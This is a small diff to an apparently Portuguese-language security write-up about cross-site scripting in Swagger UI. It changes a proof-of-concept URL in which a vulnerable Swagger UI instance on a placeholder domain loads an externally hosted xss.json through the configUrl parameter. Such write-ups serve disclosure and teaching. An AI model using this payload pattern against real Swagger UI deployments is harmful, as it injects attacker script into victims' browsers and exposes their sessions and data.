@@ -25,7 +25,7 @@ Um ataque de XSS ocorre quando um atacante consegue injetar scripts maliciosos e
 
 #### Poc
 ```
-http://swagger-ui-sitevul.exemplo.com/index.html?configUrl=https://jeanrafaellourenco.github.io/xss-poc/swagger/xss.json
+http://swagger-ui-sitevul.exemplo.com/index.html?configUrl=https://jeanrafaellourenco.github.io/xss-poc/swagger/xss.json#/Usuários/listUsers
 ```
 
 ### Impactos de um XSS no Swagger UI
